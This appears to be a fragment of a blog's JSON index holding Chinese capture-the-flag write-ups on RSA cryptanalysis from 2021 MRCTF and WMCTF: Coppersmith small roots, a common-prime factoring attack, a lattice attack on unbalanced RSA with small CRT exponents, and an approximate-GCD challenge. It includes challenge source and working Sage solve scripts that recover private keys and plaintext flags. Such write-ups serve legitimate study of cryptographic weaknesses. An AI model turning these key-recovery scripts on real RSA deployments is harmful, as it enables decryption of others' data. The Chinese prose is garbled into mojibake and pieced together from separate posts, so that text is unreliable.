0xeaf06b9050a809659f962251b14d6b93009a7010f0e8d8f0fa4d71591757e98243b8ff50ec98a4e140fd8a63bbb4b8bb0a6d302a48845b8b09d1e40874fcb586ddccbb0bbf86d21540ec6c15c1d2bf925942f6f384fdc1baae7f8e06150ccd9459eb65d0f07eea16a911fa0a17e876a145dbfec83537ca2bee4641897b9f7f5print(hex(n2))# 0x6d457110d6044472d786936acbd3cd93c7728daa3343b35ccaa5c55eba6b35c28c831bb245b8cdd8fc8cb67a72f57e62a0e1259f5e804c487a8478f6895b302d39277bd73947598a5f8ec0a535be9e9a4d34df91df948ee44cc3d13d14e23b9651089e4767c7f0e7245df55619c92fe24483225d35f5f3ee6f74375065766ffdprint(hex(pow(bytes_to_long(flag.encode()), 65537, n2)))# 0x15be2b0eaef8837a753587c47d3f31696a7d239d88837a9b7d903cd0d0648ef8e225ea555402693a23f305d19e7e13905be61b44c651dba5b26614bcf876234e765a724e0ed8af4a4e408e6a233c48ab9cc63e9c552ef9cd1999512aa0aca830fe6cbcbcc3c6bb354903124a2c3a12d442cdbdefdae6576f4bbc1515051b7111 analysesè¿™é“é¢˜åšçš„æ—¶å€™è‡ªå·±è¸©äº†å‘, ä¹Ÿæ²¡åšå‡ºæ¥, åé¢çœ‹wpæ‰¾åˆ°äº†é‚£ä¸ªpaperæ‰å¤§æ¦‚æ˜ç™½, å…³äºç•Œçš„ç¡®å®šè¿˜å¾—è°¢è°¢d33å¸ˆå‚…. coppersmithè¿™é¢˜çš„ç¬¬ä¸€ä¸ªproblemå°±æ˜¯æ±‚è§£$g_1$, ç¬¬ä¸€ä¸ªæ˜æ–‡å¯ä»¥åˆ†æˆä¸‰éƒ¨åˆ†$$Plaintext_1 = high | g_1 | low \\tag 1$$$high$å’Œ$low$æˆ‘ä»¬éƒ½æ˜¯çŸ¥é“çš„, è€Œ$g1$å’Œ$low$çš„ä½æ•°åˆ†åˆ«ä¸º$230,463$ æ‰€ä»¥ç†è®ºä¸Š$(1)$å¼å¯ä»¥å†™æˆ$$Plaintext_1 = 2^{693} \\cdot high + 2^{463}\\cdot g_1 + low$$è¿™é‡Œå°±æœ‰ä¸ªå‘äº†, å­—ç¬¦ä¸²åœ¨æ‹¼æ¥çš„æ—¶å€™è‚¯å®šéƒ½æ˜¯å®Œæ•´çš„å­—èŠ‚åœ¨æ‹¼çš„, æ‰€ä»¥æ¯ä¸€æ®µçš„ä½æ•°éƒ½åº”è¯¥æ˜¯8çš„å€æ•°æ‰å¯¹, æ‰€ä»¥æ­£ç¡®çš„$(1)$å¼åº”è¯¥ä¸º:$$Plaintext_1 = 2^{696} \\cdot high + 2^{464} \\cdot g_1 + low$$ $g_1$çš„ä½æ•°ä¸º$230$, æ˜¯æ»¡è¶³coppersmithçš„æ¡ä»¶çš„. æˆ‘ä»¬è®°$mbar = 2^{696}\\cdot high + low$, é‚£ä¹ˆå°±æœ‰$c_1 = (mbar+2^{464}\\cdot g_1)^3 \\mod n_1$, åŒ–æˆé¦–ä¸€å¤šé¡¹å¼åcoppersmith methodå³å¯æ±‚å‡º$g_1$ further attacks on server-aided rsaæˆ‘ä»¬ä»ä¸Šéƒ¨åˆ†å¾—åˆ°äº†$g_1$ , æˆ‘ä»¬å¯ä»¥çœ‹çœ‹$p,q$å’Œ$g$çš„å…³ç³», ä¸ºäº†æ–¹ä¾¿è®¨è®º, ç›´æ¥è®°$g = 2g_1$$$p = xg+1 \\\\q = yg+1$$é‚£ä¹ˆæˆ‘ä»¬æœ‰$${N - 1 \\over g} = xyg + (x+y) \\tag 2$$è¿™é‡Œè®¾$xy = u - c, x+y =v+cg$, é‚£ä¹ˆ$(2)$å¼å¯ä»¥åŒ–æˆ$${N - 1 \\over g} = ug+v$$è¿™é‡Œçš„$v &lt; g$ , ä¹Ÿå°±æ˜¯æŠŠ$v$çœ‹æˆæ˜¯${N-1\\over g }\\mod g$çš„ç»“æœ. é‚£ä¹ˆ$u,v$éƒ½æ˜¯å¯ä»¥è®¡ç®—å‡ºæ¥çš„, é‡ç‚¹åœ¨äºæ–°å¼•å…¥çš„$c$, æ±‚å‡º$c$å°±å¯ä»¥æ±‚$p,q$äº† paperé‡Œæä¾›äº†ä¸€ç§åˆ©ç”¨bsgsåŒ—ä¸Šå¹¿æ·±æ€æƒ³çš„æ–¹æ³•æ¥æ±‚å‡ºè¿™ä¸ªc, ä½†è¿™é¢˜è·Ÿpaperåœ¨cçš„ç•Œä¸Šæœ‰åŒºåˆ«. åŸpaperæ˜¯è¿™æ ·çš„, æˆ‘ä»¬éšä¾¿æ‰¾ä¸€ä¸ªç´ æ•°$a$ , è§‚å¯Ÿä¸‹é¢çš„å¼å­$$a^{ug} \\equiv a^{xyg+cg} \\equiv a^{cg} \\mod N$$ä¸ºä»€ä¹ˆ$a^{xyg}$æ²¡æœ‰äº†å‘¢? å› ä¸º$k \\cdot lcm(p-1,q-1) = xyg$ . ç„¶åæ±‚ä¸€ä¸‹$c$çš„ä¸Šç•Œ, åé¢è¦ç”¨åˆ°$$\\begin{align}&amp;\\because x+y =v+ cg \\\\&amp;\\therefore x+y &gt; cg \\\\&amp;\\because x,y \\approx {\\sqrt{N} \\over g} \\\\&amp;\\therefore cg &lt; {2 \\sqrt{N} \\over g} \\\\&amp;\\therefore 0&lt;c &lt; {2 \\sqrt{N} \\over g^2}\\end{align}$$è®°$b = a^g \\mod N$, æˆ‘ä»¬æœ‰$b^u \\equiv b^c \\mod N$ , paperé‡Œæåˆ°äº†è¿™ä¸ª$u,c$æ˜¯å¾ˆå¤§æ¦‚ç‡ç›¸ç­‰çš„, æœ‰å¸ˆå‚…çŸ¥é“ä¸ºä»€ä¹ˆå—?æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨bsgsçš„æ€æƒ³, è®¡ç®—ä¸¤ç»„æ•°.$$\\begin{align}&amp; b^0,b^D,b^{2D},\\cdots,b^{D^2} \\mod N \\\\&amp; b^u,b^{u-1},b^{u-2},\\cdots,b^{u-D} \\mod N\\end{align}$$å…¶ä¸­$D = \\lfloor \\sqrt{ {2 \\sqrt N \\over g^2}-0}\\rceil$ åœ¨è¿™ä¸¤ç»„æ•°ä¸­æœç´¢ç¢°æ’, ä¹Ÿå°±æ˜¯$b^{u-i} \\equiv b^{kD} \\mod N$ . æ‰¾åˆ°ç¢°æ’ä»¥åå°±å¯ä»¥è®¡ç®—$c = kD + i$äº†, æœ‰äº†$c$å°±å¯ä»¥åˆ†è§£$N$äº† å½“æˆ‘çœ‹å®Œpaperä»¥åå…´å¥‹çš„å†™äº†$exp$, å´å‘ç°è¿™ä¸ªåŒ—ä¸Šå¹¿æ·±æŠŠæˆ‘å†…å­˜å…¨éƒ¨åƒå®Œéƒ½æ²¡æœ‰ç»“æœ(æ—©ä¸Šèµ·æ¥å‘ç°ç”µè„‘å±å¹•éƒ½æ‰“ä¸å¼€äº†â€¦.æ€ä¹ˆä¼šæ²¡ç»“æœå•Šâ€¦åªèƒ½å»çœ‹d33å¸ˆå‚…çš„wpäº†! å› ä¸ºä»–ä»€ä¹ˆéƒ½ä¼š, çœ‹å®Œæ‰æ˜ç™½åŸæ¥paperé‡Œçš„ç•Œå¤ªæ¾æ•£äº†, å¯¼è‡´$D$å¤ªå¤§, è·‘å‡ºæ¥éœ€è¦å¤šå‡ æ ¹å†…å­˜æ‰è¡Œ, å¯æ˜¯æˆ‘åªæœ‰ä¸€æ ¹8Gçš„å†…å­˜. d33å¸ˆå‚…çš„ç•Œ: å› ä¸º$p,q$çš„ä½æ•°ç›¸åŒ, æ‰€ä»¥æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªéšè—çš„å…³ç³»å¼$$p&gt;2q \\implies x &lt; 2y \\tag3 \\implies {x\\over 2}&lt; y$$è¿™ä¸ªå¼å­å¾ˆé‡è¦, æˆ‘ä»¬ç»§ç»­è§‚å¯Ÿä¸€ä¸‹$x+y$å’Œ$c$çš„å…³ç³»$x+y -v = cg$, æˆ‘ä»¬å¯ä»¥æ ¹æ®åŸºæœ¬ä¸ç­‰å¼å†™å‡ºä¸Šç•Œ, å†æ ¹æ®$(3)$å¼å†™å‡ºä¸‹ç•Œ$${ 3\\sqrt N \\over 2g } - v\\approx {3\\over 2}x-v\\leq cg \\leq 2 \\sqrt{xy} - v \\approx {2\\sqrt N \\over g} -v$$æ ¹æ®è¿™ä¸ª, å’±ä»¬å°±æœ‰ä¸€ä¸ªæ›´åŠ ä¸¥æ ¼çš„$c$çš„ç•Œ$$c \\in [ { 3\\sqrt N - 2gv\\over 2g^2 },{2\\sqrt N - gv \\over g^2} ]$$åŒæ ·çš„, è®¡ç®—$D = \\lfloor {2\\sqrt N - gv \\over g^2}- { 3\\sqrt N - 2gv\\over 2g^2 } \\rceil $, å†ç”¨bsgså°±å¯ä»¥æ±‚å‡º$c$äº†, ä½†æˆ‘8Gçš„å°å†…å­˜ä¾æ—§è·‘ä¸å‡ºæ¥, åªèƒ½å€Ÿç”¨ä¸€ä¸‹d33å¸ˆå‚…çš„æ•°æ®äº† åˆ†è§£äº†$n_1$å°±èƒ½æ±‚å‡º$g_2$, ç”±äº$g_2$çš„ä½æ•°æ¯”è¾ƒå¤§, $g_2 &gt; x+y$, ç›´æ¥å°±æœ‰:$${n_2 - 1 \\over 2g_2} = x+y \\mod 2g_2$$$xy$ä¹Ÿå¯ä»¥ç›´æ¥æ±‚å‡ºæ¥äº†, ç„¶åä¾æ—§æ˜¯åˆ†è§£$n_2$, å°±å¯ä»¥æ±‚å‡ºflagäº† exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from Crypto.Util.number import long_to_bytes as l2b,bytes_to_long as b2lfrom time import timefrom gmpy2 import irootn1 = 0x48b11209b62c5bc580d00fc94886272b92814ce35fcd265b2915c6917a299bc54c2c0603c41f8bf7c8f6f2a545eb03d38f99ec995bf6658bb1a2d23056ee21c7230caa2decec688ea9ee00b0d50b39e8cd23eb2c3ddeb20f5ab26777b80052c171f47b716e72f6aee9cece92776fc65119046f9a1ad92c40e2094d7ed7526d49n2 = 0x6d457110d6044472d786936acbd3cd93c7728daa3343b35ccaa5c55eba6b35c28c831bb245b8cdd8fc8cb67a72f57e62a0e1259f5e804c487a8478f6895b302d39277bd73947598a5f8ec0a535be9e9a4d34df91df948ee44cc3d13d14e23b9651089e4767c7f0e7245df55619c92fe24483225d35f5f3ee6f74375065766ffdc1 = 0x27d8d7249643668ffc115be8b61775c60596e51f6313b47ad5af8493526922f5e10026a2cdaef74e22c3eec959dd8771abe3495b18d19f97623f5a3f65f22ff8fc294fc37ceb3b43ebbbf8a9bcf622922e22c5520dbd523483b9dc54fdffcd1a1b3f02ca1f53b75413fb79399ca00034f2acf108ac9a01bd24d2b9df6e27d156c2 = 0xeaf06b9050a809659f962251b14d6b93009a7010f0e8d8f0fa4d71591757e98243b8ff50ec98a4e140fd8a63bbb4b8bb0a6d302a48845b8b09d1e40874fcb586ddccbb0bbf86d21540ec6c15c1d2bf925942f6f384fdc1baae7f8e06150ccd9459eb65d0f07eea16a911fa0a17e876a145dbfec83537ca2bee4641897b9f7f5c3 = 0x15be2b0eaef8837a753587c47d3f31696a7d239d88837a9b7d903cd0d0648ef8e225ea555402693a23f305d19e7e13905be61b44c651dba5b26614bcf876234e765a724e0ed8af4a4e408e6a233c48ab9cc63e9c552ef9cd1999512aa0aca830fe6cbcbcc3c6bb354903124a2c3a12d442cdbdefdae6576f4bbc1515051b7111a = b2l(b'Common prime RSA is a variant of RSA') &lt;&lt; 696b = b2l(b'And the common factor g is large prime and p=2ga+1 q=2gb+1')mbar = a+bR.&lt;x&gt; = Zmod(n1)[]f = ((2^464) * x + mbar) ^ 3 - c1f = f.monic()g1 = int(f.small_roots(X=2^230,beta=1)[0])beta = 2* g1v = ((n1 - 1) // beta)% betau = ((n1 - 1) // beta - v) // betab = pow(2,beta,n1)left = (2*int(sqrt(n1))//beta-2-v)//beta right = (3*int(sqrt(2)*sqrt(n1))//(2*beta) - 2 - v )//beta D = int(sqrt(right - left)) + 1############################################################## è¿™éƒ¨åˆ†åº”è¯¥æ˜¯bsgséƒ¨åˆ†ç”±äºæ²¡åŠæ³•è·‘å‡ºç»“æœ,æ— æ³•ç¡®å®šè‡ªå·±çš„ç®—æ³•æ˜¯å¦æ­£ç¡® ## æ‰€ä»¥å°±å…ˆä¸æ”¾å‡ºæ¥äº†,æƒ³çŸ¥é“å…·ä½“çš„å¯ä»¥æ‰¾d33å¸ˆå‚…çš„åšå®¢ ##############################################################c=left+698170*D+5980588xy = u - c x_y = v + c * betax = var('x')f = x^2 - x_y * x + xyx,y = f.roots()[0][0],f.roots()[1][0]p,q = x *beta+1,y*beta+1assert p*q == n1g2 = int(pow(c2,int(inverse_mod(65537,(p-1)*(q-1))),n1))beta = 2 * g2x_y = ((n2 - 1) // beta)% betaxy = ((n2 - 1) // beta - x_y) // betax = var('x')f = x^2 - x_y * x + xyx,y = f.roots()[0][0],f.roots()[1][0]p,q = x *beta+1,y*beta+1assert p*q == n2l2b(pow(c3,int(inverse_mod(65537,(p-1)*(q-1))),n2)) Strange_CRTproblem1234567891011121314151617181920212223242526272829303132333435from gmpy2 import *from random import *from Crypto.Util.number import *from flag import flagbeta = 0.34delta = 0.02amplification = 2048p = getPrime(int(beta * amplification))q = getPrime(int((1 - beta) * amplification))N = p * qwhile True: dq = getrandbits(int(delta*amplification)) dp = getrandbits(int((beta-delta) * amplification)) if (dp-dq) % gcd(p-1, q-1) != 0: continue d = ((inverse((p-1)//gcd(p-1, q-1), (q-1)//gcd(p-1, q-1)) * (dq-dp)//gcd(p-1, q-1)) % ((q-1)//gcd(p-1, q-1))) * (p-1) + dp if gcd(d, (p-1)*(q-1)) == 1: breake = inverse(d, (p-1)*(q-1))m = bytes_to_long(flag.encode())c = pow(m, e, N)print('N =', N)print('e =', e)print('c =', c)'''N = 7194944829894746935571965271122989443610702698015123026500274312320541540511952275333536082176132102091625202863345739074691901574020649953130369453360247690506566827078013306825941200018330639608298539682191482947557146237487451707849833303794107411686130468587672820352641436722348277258977791778239539008852841749667581869688275892813664557078043533743669277649148468667399393518112220602616186358353262921270486781426670131125521444335280904901224934061164334131460273779473387748722008412594372005590209919098686472153912130124772089012962023984089123929555594332030502775588070235834837667605812843128059372243e = 5872666789397408936685003821802975734744078884385553897196686533187747297681714766542317071546532454504513425295170366015384657690105523240363850101369048640430719519784564240908244756652800934680608667950183962226340288720771217107508516125044088043789281574833079766048266075717484676158307477384862873719462770774288252074344824446884295300603035728339571606659365040029505127532956295163195257002051007447197735267997104725561159289832252522298457628452222155625714679911912616173849423059919537353814530280736653541415686756485413316581322357887750268983241858913704388088485132644523120028234659344174431547087c = 6601667269134560091452287214083525217696007424340765571114688738279264700361513951309195757650152324371826111195352731779137577044473630747863137747356695892337017953751159248388157498368915463745769509485009626774902347006319659852239932231921393353157319713540010424345134411781723171111939891127671029064626426950125001347122070491553845919803891156107693973027238705710354919725550360159383455222982999904576805089837067774838194257113022653159325313574447189639317397889065351340828031907571541750274329094240472180870714728295651611160552345500801797030280900507979459558944006193012524181456837126192865748097''' May2002_Chapter_CryptanalysisOfUnbalancedRSAWi è¿™ç¯‡paperä»‹ç»äº†é’ˆå¯¹dpè¿‡å°å¹¶ä¸”p,qç›¸å·®è¿‡å¤§çš„æƒ…å†µä¸‹å¯¹rsaçš„ä¸€ç§æ”»å‡»æ–¹æ³•, å…·ä½“çš„åŸç†å¯ä»¥çœ‹è¿™ç¯‡è®ºæ–‡, è¿™è¾¹å°±ç®€å•çš„è¯´ä¸€ä¸‹æ¡ä»¶ è¦ä½¿ç”¨è¿™ä¸ªæ”»å‡»æ–¹æ³•å¿…é¡»æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶$$q &lt; N^\\beta, d_p &lt; N^\\delta \\\\beta &lt; 0.382 , \\delta \\ è¶Šå°è¶Šå¥½å§ å…·ä½“çš„ç•Œæˆ‘ä¹Ÿæ²¡çœ‹æ˜ç™½$$è¿™ä¸ªæ–¹æ³•åˆ©ç”¨äº†ä¸€ä¸ªå®šç† (Howgrave-Graham) Let f (x, y) be a polynomial that is a sum of at most Ï‰ monomial. Suppose f (x0, y 0) = 0 mod pm for some positive integer m, where |x0| â‰¤ X and |y0| â‰¤ Y . If || f (xX, yY )|| &lt; pm âˆšÏ‰ , then f (x0, y 0) = 0 holds over the integers. $f(x,y)$æ˜¯ä¸€ä¸ªæœ€å¤§wé˜¶çš„å¤šé¡¹å¼, å‡è®¾å­˜åœ¨$|x_0| â‰¤ X,|y_0| â‰¤ Y$,å¯¹äºä¸€äº›æ­£æ•´æ•°mæœ‰$f(x_0,y_0) = 0 \\mod p^m$, å¦‚æœ$||f(xX,yX)|| &lt; {p^m \\over \\sqrt w}$, é‚£ä¹ˆ$f(x_0,y_0) = 0$åœ¨æ•´æ•°ä¸Šæˆç«‹, åƒåœ¾ç¿»è¯‘ å¤§æ¦‚å°±æ˜¯è¿™ä¸ªæ„æ€ æ„é€ æ ¼$$\\begin{pmatrix}N^2X^3&amp;&amp;&amp; \\eNX^3&amp;-NX^2Y&amp;&amp; \\e^2X^3&amp;-2eX^2Y&amp;XY^2&amp; \\e^3X^3&amp;-3e^2X^2Y&amp;3eXY^2&amp;-Y^3\\end{pmatrix}$$å…¶ä¸­$X = N^\\delta, Y = N^{\\delta + \\beta}$ è¿™ä¸ªæ ¼å­æ¯ä¸€è¡Œéƒ½æ˜¯$eX - Y$çš„å€æ•°, æ‰€ä»¥æœ€åç»„æˆçš„æœ€çŸ­è¡Œå‘é‡ä¸­çš„$X,Y$æ›¿æ¢æˆ$x,y$, å¾—åˆ°çš„æ–¹ç¨‹çš„æ ¹$(x_0,y_0)$å°±æ˜¯,$ex-y$è¿™ä¸ªæ–¹ç¨‹çš„æ ¹. æ‰€ä»¥ç›´æ¥è§„çº¦æ ¼åŸº, æŠŠæœ€çŸ­å‘é‡ä¸­çš„$X,Y$éƒ½é™¤æ‰, åˆ©ç”¨å¾—åˆ°çš„ç³»æ•°é‡æ–°æ„é€ ä¸€ä¸ªæ•´æ•°ä¸Šçš„æ–¹ç¨‹, æœ€åå› å¼åˆ†è§£æ‰¾åˆ°ä¸€æ¬¡çš„é¡¹çš„ç³»æ•°å°±æ˜¯$d_p,k+1$ exp123456789101112131415161718192021222324252627282930313233343536373839404142from sage.all import *from Crypto.Util.number import long_to_bytesN = 7194944829894746935571965271122989443610702698015123026500274312320541540511952275333536082176132102091625202863345739074691901574020649953130369453360247690506566827078013306825941200018330639608298539682191482947557146237487451707849833303794107411686130468587672820352641436722348277258977791778239539008852841749667581869688275892813664557078043533743669277649148468667399393518112220602616186358353262921270486781426670131125521444335280904901224934061164334131460273779473387748722008412594372005590209919098686472153912130124772089012962023984089123929555594332030502775588070235834837667605812843128059372243e = 5872666789397408936685003821802975734744078884385553897196686533187747297681714766542317071546532454504513425295170366015384657690105523240363850101369048640430719519784564240908244756652800934680608667950183962226340288720771217107508516125044088043789281574833079766048266075717484676158307477384862873719462770774288252074344824446884295300603035728339571606659365040029505127532956295163195257002051007447197735267997104725561159289832252522298457628452222155625714679911912616173849423059919537353814530280736653541415686756485413316581322357887750268983241858913704388088485132644523120028234659344174431547087c = 6601667269134560091452287214083525217696007424340765571114688738279264700361513951309195757650152324371826111195352731779137577044473630747863137747356695892337017953751159248388157498368915463745769509485009626774902347006319659852239932231921393353157319713540010424345134411781723171111939891127671029064626426950125001347122070491553845919803891156107693973027238705710354919725550360159383455222982999904576805089837067774838194257113022653159325313574447189639317397889065351340828031907571541750274329094240472180870714728295651611160552345500801797030280900507979459558944006193012524181456837126192865748097beta = 0.34delta = 0.02amplification = 2048X = int(N ** delta)Y = int(N ** (delta + beta))M = Matrix( [ [N ** 2 * X ** 3, 0, 0, 0], [e * N * X ** 3, -N * X ** 2 * Y, 0, 0], [e ** 2 * X ** 3, -2 * e * X ** 2 * Y, X * Y ** 2, 0], [e ** 3 * X ** 3, -3 * e ** 2 * X ** 2 * Y, 3 * e * X * Y ** 2, -(Y ** 3)], ])L = M.LLL()[0]x,y = var('x'),var('y')f = x ** 3*(L[0] // X ** 3) + x ** 2 * y * (L[1] // X**2 // Y)+ x * y ** 2 * (L[2] // X // Y ** 2)+ y ** 3 * (L[3] // Y** 3)print(f.factor())'''(144242809483056840663075735623298553029680437297789965222541248349475437890222709450048997656976387390752105996145725490546933534602744908786700426835710727511955799912350818546609860818884274334936799981304721460528637717*x + 636751972323*y)'''dp = 636751972323k = 144242809483056840663075735623298553029680437297789965222541248349475437890222709450048997656976387390752105996145725490546933534602744908786700426835710727511955799912350818546609860818884274334936799981304721460528637717 + 1assert (e * dp - 1 ) % k == 0p = (e * dp - 1 ) // k + 1assert N % p == 0q = N // pphi = (p - 1) * (q - 1)d = inverse_mod(e,phi)print(long_to_bytes(pow(c,d,N)))","link":"/2021/04/17/writeup-for-2021-MRCTF/"},{"title":"writeup for 2021 WMCTF","text":"æ¯”èµ›é‚£å¤©åˆšå¥½è¿”æ ¡, æ²¡æ€ä¹ˆæ‰“, å¤ç›˜ä¸€ä¸‹ checkinçŒœè°œä¸€æ ·â€¦ ç›´åˆ°æ˜¯èƒŒåŒ…é—®é¢˜ä¹Ÿä¸çŸ¥é“å…·ä½“è¯¥åšä»€ä¹ˆâ€¦. æŒ‚ç€å…ˆ baby_OCB çº¢æ˜å¤, ä¸‹æ¬¡ä¸€å®šå­¦ä¼šå’•å’•å’•å’•å’• easylsbproblem123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#!/usr/bin/python3# encoding: utf-8import randomimport stringimport sysimport osfrom hashlib import sha256import uuidfrom Crypto.Util.number import *password = b'Hidden'flag = ('flag{' + str(uuid.uuid4()) + '}').encode()# def proof_of_work():# random.seed(os.urandom(8))# proof = ''.join([random.choice(string.ascii_letters+string.digits) for _ in range(20)]).encode()# digest = sha256(proof).hexdigest()# printf(&quot;sha256(XXXX+%s) == %s&quot; % (proof[4:].decode(),digest))# printf('Give me XXXX:')# x = read_str()# if len(x) != 4 or sha256(x.encode()+proof[4:]).hexdigest() != digest: # return False# return Truedef printf(message): sys.stdout.write('{0}\\n'.format(message)) sys.stdout.flush() sys.stderr.flush()def read_str(): return sys.stdin.readline().strip()def read_int(): return int(sys.stdin.readline().strip())def next_prime(a): while not isPrime(a): a += 2 return adef get_prime(a): suffix = getPrime(368) return next_prime(a ** 2 + suffix + 1)def generate_pubkey(key): p, q = get_prime(getPrime(512)), get_prime(key) n = p * q return ndef airdrop(a): n = generate_pubkey(a) printf('gift: {}'.format(n)) returndef hint(n, e, c): printf('n = {}'.format(n)) printf('e = {}'.format(e)) printf('c = {}'.format(c)) returndef leak(): p = get_prime(getPrime(512)) e = 0x1000 c = pow(bytes_to_long(flag), e, p) hint(p, e, c) returndef backdoor(): printf('Input your password:') user_input = read_str() if user_input.encode() == password: leak() else: printf('Wrong') exit(0)if __name__ == '__main__': # if not proof_of_work(): # exit(0) a = getPrime(512) print(a) p = get_prime(a) q = get_prime(getPrime(512)) n = p * q e = 0x10001 max_time = 5 password_enc = pow(bytes_to_long(password), e, n) printf('====================================',) printf('1. Airdrop ',) printf('2. Backdoor ',) printf('3. Hint ',) printf('4. Exit ',) printf('====================================',) try: while True: printf('Your choice:') choice = read_int() if choice == 1: if max_time &gt; 1: airdrop(a) max_time -= 1 printf('Done!') else: printf('Greed will destroy you!') continue elif choice == 2: backdoor() printf('Done!') continue elif choice == 3: hint(n, e, password_enc) printf('Done!') continue elif choice == 4: printf('bye~') exit(0) continue else: printf('Invalid!') continue except: exit(-1) è¦å¾—åˆ°flag å¿…é¡»é€šè¿‡leak() è€Œè¦è°ƒç”¨leak()å¿…é¡»çŸ¥é“password çœ‹ä¸€ä¸‹airdrop()å‡½æ•° choice 1æ¯æ¬¡è°ƒç”¨éƒ½ä¼šç»™ä¸€ä¸ªgift ä¹Ÿå°±æ˜¯$n$$$n_i = q_i (a^2 + x_i) = q_ia^2 + q_ix_i$$ The Approximate GCD Problemä¹‹å‰çš„æ¯”èµ›ä¹Ÿæœ‰é‡åˆ°è¿‡, è¿™æ¬¡è®¤çœŸçš„å†çœ‹çœ‹$AGCD$ è¿™é‡Œæ˜¯ä¸ª$AGCD$é—®é¢˜, æ‰€è°“çš„$AGCD$å°±æ˜¯è¿‘ä¼¼å€¼$GCD$ æ¯”å¦‚ç°åœ¨æœ‰$$n_0 = p_0 \\cdot q \\n_1 = p_1 \\cdot q \\gcd(n_0,n_1) = q$$è¿™ä¸ªå°±æ˜¯ä¸€èˆ¬çš„$GCD$é—®é¢˜,è€Œ$AGCD$å‘¢å°±æ˜¯ç»™è¿™é‡Œçš„æ¯ä¸ª$n$éƒ½åŠ ä¸Šä¸€ä¸ª$error \\ \\ -&gt; \\ (x)$$$n_0 = p_0 \\cdot q + x_0\\n_1 = p_1 \\cdot q + x_1\\$$é‚£è¿™æ ·è¦æ±‚å‡º$q$å°±ä¸èƒ½ç”¨ä¹‹å‰çš„ç®—æ³•äº†. ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜å¯ä»¥æŠŠè¿™ä¸¤è¡Œåˆæˆä¸€ä¸‹$$p_1n_0 - p_0n_1 = p_1x_0 - p_0x_1$$åƒè¿™ç§å½¢å¼çš„ä¸€çœ‹å°±å¯ä»¥å†™åˆ°ä¸€ä¸ªæ ¼å­é‡Œé¢å»$$(p_0,p_1)\\begin{pmatrix}R&amp;n_1 \\0&amp;-n_0\\end{pmatrix}=(p_0R,p_1x_0-p_0x_1)$$å³è¾¹çš„å‘é‡çš„èŒƒæ•°è·Ÿ$R,p,x$æ˜¯æœ‰å…³çš„, è€Œ$R$æ˜¯å¯ä»¥è°ƒæ•´çš„, æ‰€ä»¥ç†è®ºä¸Šåªè¦å³è¾¹çš„å‡ ä¸ªå‚æ•°å¤Ÿå°, æˆ‘ä»¬æ˜¯æœ‰æœºä¼šæ‰¾åˆ°è¿™ä¸ªå‘é‡ä»è€Œæ±‚å‡º$p_0$, æ±‚å‡º$p_0$å°±èƒ½è§£å†³$AGCD$é—®é¢˜äº†. ç°åœ¨å›åˆ°é¢˜ç›®. ç°åœ¨æœ‰äº”è¡Œå¼å­$$n_0 = q_0a^2 + q_0x_0 \\n_1 = q_1a^2 + q_1x_1 \\\\cdots \\n_4 = q_4a^2 + q_4x_4 \\$$å…¶å®è¿™é‡Œæˆ‘ä¸€æ‹¿åˆ°è¿™äº”è¡Œå°±å¼€å§‹æ„é€ æ ¼å­åšäº†, ä½†dbtğŸ‘´æé†’äº†æˆ‘, $AGCD$é—®é¢˜å³è¾¹å‚æ•°è¶Šå°è¶Šå¥½, è€ƒè™‘ä¸€ä¸‹å¼€æ–¹, å› ä¸º$AGCD$é—®é¢˜æœ¬èº«å°±æ˜¯ä¸€ä¸ªè¿‘ä¼¼å€¼æ±‚è§£GCDçš„é—®é¢˜. æ‰€ä»¥æˆ‘ä»¬åœ¨åšçš„è¿‡ç¨‹ä¸­ä¹Ÿåšç‚¹è¿‘ä¼¼ä¸€èˆ¬æ˜¯ä¸ä¼šå½±å“çš„(?æœ‰çˆ·çˆ·ç ”ç©¶è¿‡è¿‘ä¼¼çš„ä¸€ä¸ªåº¦å—$$\\sqrt{n_0} = \\sqrt{q_0}\\sqrt{a^2 + x_0} \\\\sqrt{n_0} - \\hat x \\approx \\sqrt{q_0}a \\\\sqrt{n_i} = \\sqrt{q_i}a + \\hat x_i$$è®©å³è¾¹çš„å¼å­æ›´å°ä¹‹å, ç”¨äº”ç»„æ•°æ®æ„é€ æ ¼å­$$\\begin{pmatrix}R&amp;\\sqrt{n_1}&amp;\\sqrt{n_2}&amp;\\sqrt{n_3}&amp;\\sqrt{n_4} \\0&amp;-\\sqrt{n_0}&amp;0&amp;0&amp;0 \\0&amp;0&amp;-\\sqrt{n_0}&amp;0&amp;0 \\0&amp;0&amp;0&amp;-\\sqrt{n_0}&amp;0 \\0&amp;0&amp;0&amp;0&amp;-\\sqrt{n_0}\\end{pmatrix}$$è§„çº¦ä¹‹åèƒ½æ‰¾åˆ°å‘é‡(åé¢çš„ä¸é‡è¦å°±å…ˆä¸å†™äº†)$$(R\\sqrt{q_0},\\cdots,\\cdots,\\cdots,\\cdots)$$ä½†åœ¨è§„çº¦çš„æ—¶å€™, å› ä¸ºèŒƒæ•°çš„é—®é¢˜, éœ€è¦ä¸æ–­çš„è°ƒæ•´$R$çš„å€¼æ‰èƒ½æ‰¾æˆ‘ä»¬éœ€è¦çš„é‚£ä¸ªå‘é‡, è°ƒæ•´çš„ä¾æ®å°±æ˜¯è¿™ä¸ª$q_0$çš„å¤§å°, è¿™ä¸ªå¤§å°æ˜¯çŸ¥é“çš„$1024 bit$,æ‰€ä»¥æœ€åå¾—åˆ°çš„$\\sqrt{q_0}$åº”è¯¥æ˜¯$512bit$ äº‹å®ä¸Š, åœ¨æˆ‘çœ‹åˆ°çš„blogé‡Œé¢, è¿™ä¸ªRçš„å–å€¼æ˜¯æœ‰ä¸€å®šçš„æ–¹æ³•çš„, æ²¡æœ‰ææ‡‚å…·ä½“è¯¥æ€ä¹ˆå»åˆ¤æ–­, æ‰€ä»¥åªèƒ½é€šè¿‡è°ƒæ•´çš„æ–¹æ³•æ¥åšè¿™é¢˜äº†, æƒ³èµ·æ¥è‡ªå·±çš„åšå®¢ä¹‹å‰ä¹Ÿæœ‰è¯•è¿‡å»æ¨ä¸€ä¸ªå¤§æ¦‚çš„å€¼, å¯ä»¥ç¿»å‰é¢çš„çœ‹çœ‹ 